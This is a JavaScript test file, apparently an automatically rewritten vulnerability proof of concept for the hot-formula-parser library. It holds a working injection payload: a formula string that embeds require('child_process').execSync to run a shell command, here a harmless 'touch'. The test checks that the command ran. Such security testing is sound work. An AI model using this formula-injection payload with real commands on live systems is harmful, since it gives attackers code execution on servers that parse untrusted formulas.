const v29 = () => {
    const v16 = expect.assertions(2);
    v16;
    const v17 = require('hot-formula-parser');
    const FormulaParser = v17.Parser;
    const fs = require('fs');
    const path = './hot-formula-parser';
    try {
        const v18 = fs.existsSync(path);
        if (v18) {
            const v19 = fs.unlinkSync(path);
            v19;
            const v20 = console.log('File removed:', path);
            v20;
        }
    } catch (err) {
        const v21 = console.error(err);
        v21;
    }
    file_exist = fs.existsSync(path);
    const v22 = expect(file_exist);
    const v23 = v22.toBe(false);
    v23;
    let parser = new FormulaParser();
    const v24 = parser.parse('SUM([(function(){require(\'child_process\').execSync(\'touch hot-formula-parser\')})(),2])');
    v24;
    file_exist = fs.existsSync(path);
    const v25 = expect(file_exist);
    const v26 = v25.toBe(true);
    v26;
    const v27 = function (err) {
    };
    const v28 = fs.unlink(path, v27);
    v28;
};
const v30 = test('Command Injection in hot-formula-parser', v29);
v30;